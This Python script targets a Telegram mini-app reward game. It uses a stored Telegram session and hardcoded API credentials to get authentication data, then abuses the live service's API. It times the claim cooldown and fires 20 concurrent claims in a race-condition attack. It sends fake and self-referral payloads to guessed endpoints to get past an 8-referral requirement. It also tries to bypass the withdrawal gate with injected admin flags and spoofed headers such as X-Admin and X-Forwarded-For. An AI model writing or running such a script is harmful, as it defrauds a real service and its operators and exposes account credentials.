"""Test race cooldown + bypass gate 8 refs."""
import sys, os, time, asyncio, json
sys.path.insert(0, os.getcwd())
import httpx, storage
storage.init()

BASE = "https://result-gotta-responsibility-firewire.trycloudflare.com"
UA = {"User-Agent":"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36",
      "Origin":BASE, "Referer":BASE+"/", "content-type":"application/json"}

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import RequestWebViewRequest
from urllib.parse import unquote

fox = [a for a in storage.list_accounts() if a.get("uid") == 8249205817][0]
async def fetch_idata():
    c = TelegramClient(StringSession(fox["session"]), 2040, "b18441a1ff607e10a989891a5462e627")
    await c.connect()
    try:
        bot = await c.get_entity("ThoDaoVang_bot")
        res = await c(RequestWebViewRequest(peer=bot, bot=bot, platform="android",
            url=BASE+"/", from_bot_menu=True, compact=True))
        fr = res.url.split("#tgWebAppData=",1)[1].split("&tgWebAppVersion")[0]
        return unquote(fr)
    finally:
        await c.disconnect()

idata = asyncio.new_event_loop().run_until_complete(fetch_idata())
H = {**UA, "X-Telegram-Init-Data": idata}

# ============ 1. Race cooldown claim — do chinh xac ============
print("=== 1. DO COOLDOWN CHINH XAC ===")
# Reset — claim hết pending trước
r = httpx.post(BASE+"/api/claim", headers=H, timeout=15)
try: print(f"    first claim: {r.json().get('ok')}")
except: pass

# Test cac moc
for secs in [55, 58, 59, 60, 61, 62, 65]:
    print(f"    cho {secs}s...")
    time.sleep(secs)
    r = httpx.post(BASE+"/api/claim", headers=H, timeout=15)
    try:
        j = r.json()
        print(f"    t+{secs}s: ok={j.get('ok')}  claimed={j.get('claimed')}")
        if j.get("ok"):
            print(f"    >>> COOLDOWN CHINH XAC ~{secs}s")
            break
    except Exception as e:
        print(f"    t+{secs}s err {e}")
    time.sleep(3)

# ============ 2. Race — 20 song song khi vua het cooldown ============
print(f"\n=== 2. RACE CLAIM (20 song song sau 61s) ===")
time.sleep(61)
from concurrent.futures import ThreadPoolExecutor, as_completed
def clm(i):
    try:
        r = httpx.post(BASE+"/api/claim", headers=H, timeout=15)
        return r.status_code, r.json()
    except Exception as e:
        return 0, {"err": str(e)[:60]}
with ThreadPoolExecutor(max_workers=20) as ex:
    res = [f.result() for f in as_completed([ex.submit(clm,i) for i in range(20)])]
ok_count = sum(1 for s,j in res if j.get("ok"))
total = sum(j.get("claimed",0) for s,j in res if j.get("ok"))
print(f"    accepted: {ok_count}/20  total_claimed: {total:,.0f}")

# ============ 3. Bypass gate 8 refs ============
print(f"\n=== 3. BYPASS GATE 8 REFS ===")
# Doc ref code cua minh
ref = httpx.get(BASE+"/api/referral", headers=H, timeout=15).json()
print(f"    my ref code: {ref.get('member_id')}  required: {ref.get('required')}")

# Thu fake referral endpoint
for body in [
    {"ref":"0000000256"},  # self ref
    {"ref_code":"0000000256"},
    {"ref":"0000000002"},  # ref user top 1
    {"referrer":"0000000256"},
    {"referral":"0000000256"},
]:
    for path in ["/api/referral/apply", "/api/referral", "/api/ref", "/api/user/referral"]:
        try:
            r = httpx.post(BASE+path, json=body, headers=H, timeout=10)
            if r.status_code != 404:
                print(f"    POST {path} {body} -> {r.status_code}  {r.text[:150]}")
        except: pass

# ============ 4. Withdraw race / bypass ============
print(f"\n=== 4. WITHDRAW BYPASS GATE ===")
# Thu cac payload khac
for body in [
    {"amount":2000,"force":True},
    {"amount":2000,"skip_gate":True},
    {"amount":2000,"bypass":True},
    {"amount":2000,"refs":8},
    {"amount":2000,"referrals":8},
    {"amount":2000,"referrals":100},
    {"amount":2000,"admin":True},
    {"amount":2000,"role":"admin"},
    {"amount":2000,"is_admin":True},
]:
    try:
        r = httpx.post(BASE+"/api/withdraw", json=body, headers=H, timeout=15)
        if "RÚT TIỀN CHƯA" not in r.text and "không hợp lệ" not in r.text:
            print(f"    {str(body)[:60]:<62} -> {r.status_code}  {r.text[:200]}")
    except: pass

# Header injection
for hdrs in [
    {"X-Admin":"1"},
    {"X-Refs":"8"},
    {"X-Referrals":"8"},
    {"X-Bypass":"1"},
    {"X-Forwarded-For":"127.0.0.1"},
    {"X-Real-IP":"127.0.0.1"},
]:
    try:
        r = httpx.post(BASE+"/api/withdraw", json={"amount":2000}, headers={**H, **hdrs}, timeout=15)
        if "RÚT TIỀN CHƯA" not in r.text:
            print(f"    hdr {hdrs} -> {r.status_code}  {r.text[:200]}")
    except: pass

# ============ 5. Do referral add ============
print(f"\n=== 5. REFERRAL ADD ===")
ref2 = httpx.get(BASE+"/api/referral", headers=H, timeout=15).json()
print(f"    full response: {json.dumps(ref2, ensure_ascii=False)}")

# ============ 6. Final me ============
print(f"\n=== 6. FINAL ===")
me = httpx.get(BASE+"/api/me", headers=H, timeout=15).json()
print(f"    balance: {me.get('balance'):,.0f}")
print(f"    referrals: {me.get('referrals')}")
print(f"    gold_per_second: {me.get('gold_per_second')}")
